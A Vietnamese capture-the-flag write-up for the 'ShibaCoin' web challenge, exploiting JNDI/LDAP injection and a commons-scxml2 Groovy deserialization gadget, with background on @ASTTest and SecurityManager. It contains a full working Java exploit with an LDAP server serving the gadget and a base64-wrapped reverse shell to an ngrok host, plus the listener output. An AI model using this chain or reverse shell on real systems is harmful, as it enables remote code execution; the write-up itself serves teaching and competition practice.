---
layout: single
title: "Shiba Coin"
date: 2025-05-16 00:00:00 +0700
categories: [BKSEC-Challenge]
tags: [CTF, BKSEC, Blockchain]
---
# ShibaCoin - web

> Tên : ShibaCoin
> Có source code.

## Phân tích
### Phân tích source code:
Phát hiện web có dùng JNDI Service với LDAP và `com.sun.jndi.ldap.object.trustSerialData` đã được bật lại,điều này cho phép LDAP có khả năng load được class động.
![image](https://dungnhvhust.github.io/images/shiba-coin_01.png)

```java=
public class JndiService {
    private static final Logger logger = LoggerFactory.getLogger(JndiService.class);
    private Context context;

    public JndiService() {
        try {

            context = new InitialContext();
            logger.info("JNDI service initialized successfully with in-memory and LDAP support");
        } catch (NamingException e) {
            logger.error("Failed to initialize JNDI context", e);
            throw new RuntimeException("Failed to initialize JNDI context", e);
        }
    }

    public Object lookup(String path) throws NamingException {
        if (context == null) {
            throw new NamingException("JNDI context is not initialized");
        }
        logger.info("Looking up JNDI resource at path: {}", path);
        return context.lookup(path);
    }

    public void bind(String path, Object obj) throws NamingException {
        if (context == null) {
            throw new NamingException("JNDI context is not initialized");
        }
        logger.info("Binding object to JNDI resource at path: {}", path);
        context.bind(path, obj);
    }
}
```
```java=
public class ShibaCoinApiApplication {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustSerialData", "true");
        
        SpringApplication.run(ShibaCoinApiApplication.class, args);
    }
}
```

Phân tích mã nguồn, ta xác định được nguồn dữ liệu đầu vào (source) là hàm bất đồng bộ  `getTransaction(transactionHash)` : 
```javascript=
async function getTransaction(transactionHash) {
    try {
        const response = await axios.get(`${API_URL}/api/transaction?hash=${transactionHash}`);
        return response.data;
    } catch (error) {
        console.error('Error retrieving transaction:', error.response?.data || error.message);
        throw new Error('Failed to retrieve transaction details');
    }
}
```
```javascript=
router.get('/get-transaction', ensureAuthenticated, async (req, res) => {
    const transactionHash = req.query.hash;

    try {
        const transaction = await transactionAPI.getTransaction(transactionHash);

        res.render('transaction-details', {
            title: 'Transaction Details - ShibaCoin',
            user: req.session.user,
            transaction,
        });
    } catch (err) {
        console.error(err);
        req.flash('error_msg', 'Failed to load transaction details');
        res.redirect('/dashboard/transactions');
    }
});

```
Test thử với `requestrepo` : `http://localhost:3000/dashboard/get-transaction?hash=ldap://qaixu8zf.requestrepo.com` ta thấy có DNS
[image](/images/shiba-coin_02.png)

Giờ việc cần làm là tìm gadget để khai thác.
Kiểm tra file `pom.xml` ta chỉ thấy có 3 dependency được dùng là :
```xml=
 <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-scxml2</artifactId>
            <version>2.0-SNAPSHOT</version>
        </dependency>
    </dependencies>
```
Đến đây là tắc,`ysoserial` không có,buộc phải mò tay,sau gần 1 tháng không tìm được gadget,khầy Nam nhả cái [writeup](https://github.com/project-sekai-ctf/sekaictf-2024/blob/main/web/lookup/solution/README.md) ra thì có gadget của scxml2 ( [Link](https://github.com/apache/commons-scxml/blob/88ca43e2c46161c529af28adcb1de5775f9a56ae/src/main/java/org/apache/commons/scxml2/env/groovy/GroovyExtendableScriptCache.java#L305) ) với sink `groovy.lang.GroovyClassLoader.parseClass()`

### Exploit
Tiếp theo có thể tạo gadget payload rồi dựng LDAP server bằng `marshalsec` trả về object serialized hoặc dùng luôn code exploit có sẵn : 
```java=
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.scxml2.env.groovy.GroovyExtendableScriptCache;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Exp implements Runnable {

    static String bashCmd = "bash -i > /dev/tcp/0.tcp.ap.ngrok.io/14383 0>&1";

    static String cmd = "bash -c {echo," + Base64.getEncoder()
                                                 .encodeToString(bashCmd.getBytes(StandardCharsets.UTF_8)) + "}|{base64,-d}|{bash,-i}";


//    static String baseUrl = "https://lookup-jvcwtkoto2v1.chals.sekai.team";

    static int ldapPort = 9000;

//    static String ldapRef = String.format("ldap://local:%d/exp", ldapPort);
//
//    static String payloadUrl = String.format("%s//x/lookup?%s", baseUrl, ldapRef);
    static String ldapRef = "ldap://host.docker.internal:9000/exp";
    static String payloadUrl = "http://localhost:3000/dashboard/get-transaction?hash=" + ldapRef;

    public static void main(final String[] args) throws Exception {
        Exp ldapRS = new Exp();
        new Thread(ldapRS).start();
        Thread.sleep(1000);
        httpGet(payloadUrl);
    }

    private static byte[] getPayload() throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objStream = new ObjectOutputStream(byteArrayOutputStream);
        GroovyExtendableScriptCache ges = new GroovyExtendableScriptCache();
        String pl = String.format(
                "@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"%s\")})\ndef x\n",
                cmd);
        System.out.printf("Sending %s\n", pl);
        ges.getScript(pl);
        objStream.writeObject(ges);
        objStream.close();
        return byteArrayOutputStream.toByteArray();
    }

    public static void httpGet(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        System.out.printf("http: %s\n",url);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.getInputStream();
    }

    @Override
    public void run() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=sekai,dc=ctf");
            config.setListenerConfigs(new InMemoryListenerConfig("listen",
                                                                 InetAddress.getByName("0.0.0.0"),
                                                                 ldapPort,
                                                                 ServerSocketFactory.getDefault(),
                                                                 SocketFactory.getDefault(),
                                                                 (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
                @Override
                public void processSearchResult(InMemoryInterceptedSearchResult result) {
                    try {
                        String base = result.getRequest().getBaseDN();
                        System.out.printf("Incoming base=%s, sending payload\n", base);
                        Entry entry = new Entry(base);
                        entry.addAttribute("javaClassName", "");
                        entry.addAttribute("javaSerializedData", getPayload());
                        entry.addAttribute("javaCodeBase", "");
                        entry.addAttribute("objectClass", "javaNamingReference");
                        entry.addAttribute("javaFactory", "");
                        result.sendSearchEntry(entry);
                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                }
            });
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.startListening();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

}
```
Compile file và chạy:
[image](/images/shiba-coin_03.png)

```
javac -cp ".;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar" Exp.java

java -cp ".;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar" Exp
```

Lấy flag:
```
> nc -nvlp 9003
listening on [any] 9003 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49304
cat /flag.txt
BKSEC{Fake_Flag}
```
>Flag:  BKSEC{Fake_Flag}

---

## Bonus
###  Groovy là gì?

**Groovy** là một ngôn ngữ scripting động chạy trên nền **JVM**, tương tự như Python hoặc Ruby, nhưng cú pháp gần giống Java. Nó có thể:

- Chạy trên JVM  
- Biên dịch script ngay tại thời điểm chạy (runtime)  
- Tương tác liền mạch với các class Java  
- Hỗ trợ các kỹ thuật meta-programming nâng cao như **AST transform** (rất quan trọng trong khai thác này)  
- Được sử dụng trong Jenkins, Gradle, và nhiều ứng dụng doanh nghiệp để thực thi plugin/script.

---

### `@ASTTest` là gì?

`@groovy.transform.ASTTest` là một **annotation trong Groovy** thực thi ở thời điểm **biên dịch**. Nó cho phép **chèn mã tuỳ ý vào quá trình biên dịch**, cụ thể là trong giai đoạn **AST transformation**.


Nguy hiểm vì Groovy sẽ **thực thi nội dung bên trong khối `value={...}` trong quá trình biên dịch**!

```groovy
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("calc") // ← EXECUTES at compile time!
})
def x
```
Dòng assert trên không phải là kiểm tra lúc chạy, mà sẽ thực thi ngay khi GroovyShell biên dịch đoạn script.

---

#### GroovyClassLoader là gì?
GroovyClassLoader là một classloader đặc biệt do Groovy cung cấp, cho phép biên dịch và load các Groovy script động.
```groovy
GroovyClassLoader loader = new GroovyClassLoader();
Class script = loader.parseClass(new File("myscript.groovy"));
```
**Danger**
Nếu truyền một script bị kiểm soát bởi attacker vào GroovyClassLoader và không có ràng buộc bảo mật (như SecurityManager hoặc sandbox), thì có thể dẫn tới RCE.

---

#### SecurityManager 
SecurityManager trong Java giới hạn những gì một đoạn code có thể thực hiện, ví dụ như chặn `Runtime.exec()`. Tuy nhiên:

Nó đã bị deprecate từ Java 17

Xoá hoàn toàn trong Java 21+

Không được kích hoạt mặc định trong hầu hết ứng dụng trừ khi cấu hình rõ ràng

Vì vậy, nếu không có SecurityManager hoặc cấu hình yếu, các script Groovy có thể thoải mái chạy lệnh hệ thống.

**Demo of secure vs. vulnerable config**
Insecure demo (no sandbox):
```java
import groovy.lang.GroovyShell;

public class Demo {
    public static void main(String[] args) throws Exception {
        String evilScript = """
            @groovy.transform.ASTTest(value={
                assert java.lang.Runtime.getRuntime().exec("calc") // Windows: calc
            })
            def x
        """;

        GroovyShell shell = new GroovyShell();
        shell.parse(evilScript); // ← This will execute `Runtime.exec`
    }
}
```
Secure setup with custom SecurityManager (Java ≤ 16)
```java
public class SecureDemo {
    public static void main(String[] args) {
        System.setSecurityManager(new SecurityManager() {
            @Override
            public void checkExec(String cmd) {
                throw new SecurityException("exec blocked: " + cmd);
            }
        });

        String script = """
            @groovy.transform.ASTTest(value={
                assert java.lang.Runtime.getRuntime().exec("calc") 
            })
            def x
        """;

        try {
            new GroovyShell().parse(script);
        } catch (Throwable e) {
            e.printStackTrace(); // Shows SecurityException
        }
    }
}
```
Ví dụ: Khi gọi `Runtime.getRuntime().exec("calc");`, nội bộ JVM sẽ gọi tiếp  `SecurityManager.checkExec("calc");` 
Nếu ứng dụng đã cài đặt một SecurityManager tùy chỉnh, phương thức `checkExec()` sẽ được gọi trước khi lệnh thực sự được thực thi, cho phép ngăn chặn RCE.

---

### Analysis Gadget Chain 
#### Flow
```
[ Attacker-controlled code ]
           |
           | 1. Khởi tạo đối tượng GroovyExtendableScriptCache
           v
+-----------------------------------------------------+
| GroovyExtendableScriptCache ges                     |
+-----------------------------------------------------+
           |
           | 2. Gọi ges.getScript(payload) để cache script độc hại
           v
+-----------------------------------------------------+
| Payload script nhúng ASTTest:                       |
| @ASTTest(value={                                    |
|   assert Runtime.getRuntime().exec("cmd")           | 
| })                                                  |
| def x                                               |
+-----------------------------------------------------+
           |
           | 3. Gọi objStream.writeObject(ges) để serialize
           v
+------------------------------------------------------+
| ObjectOutputStream ghi toàn bộ đối tượng `ges`       |
| → Bao gồm scriptCache chứa payload                   |
+------------------------------------------------------+
           |
           | 4. Trả về payload dạng byte[]              
           v
+------------------------------------------------------+
|          return byteArrayOutputStream                |
+------------------------------------------------------+


[ Giai đoạn DESERIALIZE tại victim ]
           |
           | 5.Khi Victim gọi readObject(payload)
           | method readObject() của class GroovyExtendableScriptCache được gọi
           |
           v
+------------------------------------------------------------+
| GroovyExtendableScriptCache.readObject(ObjectInputStream)  |
| → in.defaultReadObject()                                   |
| → ensureInitializedOrReloaded()                            |
+------------------------------------------------------------+
           |
           | 6. ensureInitializedOrReloaded()              
           |    - Recompile lại các script trong cache     
           v
+-----------------------------------------------------+
| GroovyShell.parse(malicious script)                 |
| → Biên dịch lại script đã nhúng @ASTTest            |
| → THỰC THI :                                        |
|   assert Runtime.getRuntime().exec("cmd")           |
+-----------------------------------------------------+
           |
           v
     SYSTEM COMMAND EXECUTED 

```

### ensureInitializedOrReloaded()

```java
protected void ensureInitializedOrReloaded() {
        if (groovyClassLoader == null) { //Khi deserialize, các transient field như groovyClassLoader sẽ là null, nên sẽ khởi tạo lại ở đây.
           
            // Lấy cấu hình compile Groovy. Có thể include các transformer như AST, sandbox policy
            compilerConfiguration = new CompilerConfiguration (getCompilerConfigurationFactory().getCompilerConfiguration());
            if (getScriptBaseClass() != null) {
                compilerConfiguration.setScriptBaseClass(getScriptBaseClass());
            }

            //Khởi tạo GroovyClassLoader mới, bypass sandbox nếu context thiếu security manager (đây là key để bypass trong môi trường Java cũ hoặc không sandboxed).
            groovyClassLoader = AccessController.doPrivileged((PrivilegedAction<GroovyClassLoader>)
                    () -> new GroovyClassLoader(getParentClassLoaderFactory().getClassLoader(), compilerConfiguration));
            if (!scriptCache.isEmpty()) {
                // de-serialized: need to re-generate all previously compiled scripts (this can cause a hick-up...):
                for (final ScriptCacheElement element : scriptCache.keySet()) {

                    //element.getScriptSource() trả về string script (ví dụ: @groovy.transform.ASTTest(...))
                    //compileScript(...) → GroovyShell.parse(...) → biên dịch lại
                    //Groovy sẽ parse các annotation ASTTest, và assert ... sẽ được thực thi tại compile-time
                    element.setScriptClass(compileScript(element.getBaseClass(), element.getScriptSource(), element.getScriptName()));
                }
            }
        }
    }
```

Sơ đồ khai thác :
```
+-----------------------------+
| ScriptCacheElement (has)    |
| - scriptSource              |
| - malicious AST payload     |
+-----------------------------+
           |
           v
+-------------------------------+
| ensureInitializedOrReloaded() |
| - detect non-null cache       |
| - loop each script element    |
+-------------------------------+
           |
           v
+-----------------------------+
| compileScript(...)          |
| - GroovyShell.parse(...)    |
| - triggers @ASTTest         |
|   → assert Runtime.exec()   |
+-----------------------------+
```


